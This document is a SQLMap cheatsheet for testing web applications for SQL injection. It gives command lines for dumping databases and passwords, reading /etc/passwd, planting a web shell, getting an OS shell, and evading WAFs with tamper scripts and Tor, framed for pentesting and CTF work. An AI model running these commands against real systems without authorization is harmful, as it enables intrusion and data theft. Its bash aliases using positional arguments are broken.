# SQLMap Cheatsheet

## Quick Start

```bash
# Basic URL testing
sqlmap -u "http://target.example.com/page?id=1"

# POST data testing
sqlmap -u "http://target.example.com/login" --data="username=admin&password=pass"

# With cookies
sqlmap -u "http://target.example.com/page?id=1" --cookie="PHPSESSID=abc123"
```

## Essential Commands

| Command | Description |
|---------|-------------|
| `sqlmap -u "URL"` | Test URL for SQL injection |
| `sqlmap -u "URL" --dbs` | List all databases |
| `sqlmap -u "URL" -D mydb --tables` | List tables in database |
| `sqlmap -u "URL" -D mydb -T users --dump` | Dump table data |
| `sqlmap -u "URL" --os-shell` | Get interactive shell |
| `sqlmap -r request.txt` | Test from Burp request file |
| `sqlmap -u "URL" --batch` | Non-interactive mode |
| `sqlmap -u "URL" --flush-session` | Reset session data |

## Target Specification

| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Target URL | `sqlmap -u "http://target.com/?id=1"` |
| `-g` | Google dork | `sqlmap -g "inurl:php?id="` |
| `-r` | Request file | `sqlmap -r request.txt` |

## Request Options

| Flag | Description | Example |
|------|-------------|---------|
| `--data` | POST data | `--data="id=1"` |
| `--cookie` | Cookie header | `--cookie="session=abc"` |
| `--random-agent` | Random User-Agent | `--random-agent` |
| `--proxy` | HTTP proxy | `--proxy="http://127.0.0.1:8080"` |
| `--tor` | Use Tor | `--tor` |
| `--check-tor` | Verify Tor | `--check-tor` |
| `--headers` | Custom headers | `--headers="X-Forwarded-For: 1.1.1.1"` |
| `--auth-type` | Auth type | `--auth-type="Basic"` |
| `--auth-cred` | Auth credentials | `--auth-cred="admin:pass"` |
| `--delay` | Delay between requests | `--delay=1` |
| `--timeout` | Request timeout | `--timeout=30` |

## Injection Options

| Flag | Description | Example |
|------|-------------|---------|
| `-p` | Testable parameter | `-p id` |
| `--dbms` | Force DBMS | `--dbms=mysql` |
| `--level` | Test level (1-5) | `--level=5` |
| `--risk` | Risk level (1-3) | `--risk=3` |
| `--technique` | SQLi techniques | `--technique=BEUSTQ` |
| `--tamper` | Tamper script | `--tamper=space2comment` |
| `--prefix` | Injection prefix | `--prefix="'"` |
| `--suffix` | Injection suffix | `--suffix="-- -"` |

## Enumeration Options

| Flag | Description | Example |
|------|-------------|---------|
| `-a` | Retrieve everything | `-a` |
| `-b` | Get banner | `-b` |
| `--current-user` | Current user | `--current-user` |
| `--current-db` | Current database | `--current-db` |
| `--is-dba` | Check if DBA | `--is-dba` |
| `--users` | List users | `--users` |
| `--passwords` | User passwords | `--passwords` |
| `--privileges` | User privileges | `--privileges` |
| `--dbs` | List databases | `--dbs` |
| `--tables` | List tables | `--tables` |
| `--columns` | List columns | `--columns` |
| `--dump` | Dump tables | `--dump` |
| `--dump-all` | Dump all tables | `--dump-all` |
| `-D` | Database name | `-D mydb` |
| `-T` | Table name | `-T users` |
| `-C` | Column name | `-C password` |

## File System Access

| Flag | Description | Example |
|------|-------------|---------|
| `--file-read` | Read file | `--file-read="/etc/passwd"` |
| `--file-write` | Write file | `--file-write="shell.php"` |
| `--file-dest` | Destination path | `--file-dest="/var/www/shell.php"` |

## Operating System Access

| Flag | Description | Example |
|------|-------------|---------|
| `--os-shell` | Interactive shell | `--os-shell` |
| `--os-pwn` | Meterpreter shell | `--os-pwn` |
| `--os-cmd` | Execute OS command | `--os-cmd="whoami"` |

## Common Workflow

### Phase 1: Detection
```bash
# Basic test
sqlmap -u "http://target.example.com/page?id=1" --batch

# With authentication
sqlmap -u "http://target.example.com/admin" --cookie="PHPSESSID=abc123" --batch

# From Burp request
sqlmap -r burp_request.txt --batch
```

### Phase 2: Database Enumeration
```bash
# List databases
sqlmap -u "http://target.example.com/?id=1" --dbs

# List tables
sqlmap -u "http://target.example.com/?id=1" -D mydb --tables

# List columns
sqlmap -u "http://target.example.com/?id=1" -D mydb -T users --columns
```

### Phase 3: Data Extraction
```bash
# Dump specific table
sqlmap -u "http://target.example.com/?id=1" -D mydb -T users --dump

# Dump specific columns
sqlmap -u "http://target.example.com/?id=1" -D mydb -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.example.com/?id=1" --dump-all --batch
```

### Phase 4: Privilege Escalation
```bash
# Check privileges
sqlmap -u "http://target.example.com/?id=1" --is-dba --privileges

# Get OS shell (if DBA)
sqlmap -u "http://target.example.com/?id=1" --os-shell

# Read system files
sqlmap -u "http://target.example.com/?id=1" --file-read="/etc/passwd"
```

## Tamper Scripts

| Script | Description |
|--------|-------------|
| `space2comment` | Replace spaces with comments |
| `between` | Replace BETWEEN with > AND < |
| `charencode` | URL encode all characters |
| `equaltolike` | Replace = with LIKE |
| `greatest` | Replace > with GREATEST |
| `space2plus` | Replace space with + |
| `unionalltounion` | Replace UNION ALL with UNION |

```bash
# Single tamper
sqlmap -u "http://target.example.com/?id=1" --tamper=space2comment

# Multiple tamper
sqlmap -u "http://target.example.com/?id=1" --tamper=space2comment,between,charencode

# List available tamper scripts
sqlmap --list-tampers
```

## WAF Bypass Techniques

```bash
# Random User-Agent
sqlmap -u "http://target.example.com/?id=1" --random-agent

# Use Tor
sqlmap -u "http://target.example.com/?id=1" --tor --check-tor

# Delay between requests
sqlmap -u "http://target.example.com/?id=1" --delay=1

# Custom prefix/suffix
sqlmap -u "http://target.example.com/?id=1" --prefix="' OR '" --suffix="'--'"

# Combine techniques
sqlmap -u "http://target.example.com/?id=1" --tamper=space2comment,between --random-agent --delay=0.5
```

## Advanced Options

### Test Level and Risk
```bash
# Level 5: Tests all parameters including cookies
# Risk 3: Uses heavy queries (potential data loss)
sqlmap -u "http://target.example.com/?id=1" --level=5 --risk=3

# Quick test
sqlmap -u "http://target.example.com/?id=1" --level=1 --risk=1
```

### Custom Detection
```bash
# Match specific string
sqlmap -u "http://target.example.com/?id=1" --string="Welcome"

# Match HTTP code
sqlmap -u "http://target.example.com/?id=1" --code=200

# Match title
sqlmap -u "http://target.example.com/?id=1" --title="Admin Panel"
```

### Output Control
```bash
# Verbose output
sqlmap -u "http://target.example.com/?id=1" -v 6

# Custom output directory
sqlmap -u "http://target.example.com/?id=1" --output-dir="/tmp/sqlmap"

# Session management
sqlmap -u "http://target.example.com/?id=1" --flush-session
sqlmap -u "http://target.example.com/?id=1" --session="session.sqlite"
```

## Automation Scripts

### Batch Testing
```bash
#!/bin/bash
# batch_sqlmap.sh
URLS_FILE="urls.txt"
OUTPUT_DIR="sqlmap_results"
mkdir -p $OUTPUT_DIR

while IFS= read -r url; do
    echo "[*] Testing $url"
    sqlmap -u "$url" --batch --dbs --output-dir="$OUTPUT_DIR" 2>&1 | tee -a results.txt
done < "$URLS_FILE"
```

### Python Wrapper
```python
#!/usr/bin/env python3
import subprocess

def test_sqlmap(url, options=None):
    cmd = ['sqlmap', '-u', url, '--batch', '--forms']
    if options:
        cmd.extend(options)
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

output = test_sqlmap("http://target.example.com/?id=1", ['--dbs', '--dump'])
print(output)
```

## Quick Reference by Scenario

### Bug Bounty
```bash
# Crawl and test
sqlmap -u "http://target.example.com" --crawl=3 --forms --batch

# Deep test
sqlmap -u "http://target.example.com/page?id=1" --level=5 --risk=3 --batch

# Extract data
sqlmap -u "http://target.example.com/page?id=1" --dbs --batch
```

### CTF Challenge
```bash
# Basic test
sqlmap -u "http://challenge.example.com/login?user=admin&pass=test" --batch

# Extract flag
sqlmap -u "http://challenge.example.com/login?user=admin&pass=test" -D ctf --tables
sqlmap -u "http://challenge.example.com/login?user=admin&pass=test" -D ctf -T flags --dump
```

### Penetration Test
```bash
# Spider application
sqlmap -u "http://intranet.company.com" --crawl=5 --forms --batch --output-dir=/tmp/sqlmap

# Test with authentication
sqlmap -r /tmp/sqlmap/request.txt --level=5 --risk=3 --batch

# Extract sensitive data
sqlmap -r /tmp/sqlmap/request.txt -D hr_database -T employees --dump --batch
```

## Common Errors and Fixes

| Error | Solution |
|-------|----------|
| "No parameter found" | Specify parameter: `-p id` or increase level: `--level=5` |
| "Connection refused" | Check target: `curl -I http://target.example.com` |
| "302 Redirect" | Use cookies: `--cookie="PHPSESSID=abc123"` |
| "WAF detected" | Use tamper scripts: `--tamper=space2comment` |

## Useful Aliases

```bash
# Add to ~/.bashrc
alias smap='sqlmap'
alias smapu='sqlmap -u'
alias smapr='sqlmap -r'
alias smapdb='sqlmap -u "$1" --dbs'
alias smaptbl='sqlmap -u "$1" -D "$2" --tables'
alias smapdump='sqlmap -u "$1" -D "$2" -T "$3" --dump'
```
